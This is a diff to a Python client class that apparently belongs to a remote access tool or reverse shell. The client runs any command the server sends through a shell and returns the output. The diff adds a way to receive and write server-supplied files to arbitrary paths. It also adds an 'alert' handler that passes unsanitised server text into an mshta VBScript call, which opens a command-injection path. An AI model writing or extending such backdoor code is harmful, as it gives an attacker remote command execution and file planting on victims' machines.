@@ -13,13 +13,28 @@ class Client():
 
 
     def receive(self):
-        msg = Message(self.s.recv(16),2) #1024 is buffer size
+        msg = Message(self.s.recv(1024),2) #1024 is buffer size
         size = msg.get_size()
         print(size)
         data = msg.utf
         while len(data) < size:
-            data += Message(self.s.recv(16),1).utf
+            data += Message(self.s.recv(1024),1).utf
         return data
+
+
+    def receive_binary(self):
+        msg = Message(self.s.recv(1024),2) #1024 is buffer size
+        size = msg.get_size()
+        print(size)
+        data = msg.bin
+        while len(data) < size:
+            data += Message(self.s.recv(1024),1).bin
+        return data
+
+
+    def save_file(self, name, content):
+        with open(name, 'wb') as file:
+            file.write(content)
 
     def communicate(self):
         while True:
@@ -32,6 +47,15 @@ class Client():
                     self.s.send(Message('error executing the command',0).message)
             elif data == 'quit':
                     sys.exit()
+            elif data[:8] == 'incoming':
+                name = data[9:]
+                content = self.receive_binary()
+                self.save_file(name, content)
+                self.s.send(Message('file received succesfully!', 0).message)
+            elif data[:5] == 'alert':
+                print('alert received')
+                alert_msg = data[6:]
+                os.system(f'''mshta vbscript:Execute("msgbox ""{alert_msg}"":close")''')
             elif len(data) > 0:
                 cmd = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                 output = Message(cmd.stdout.read() + cmd.stderr.read(), 1)
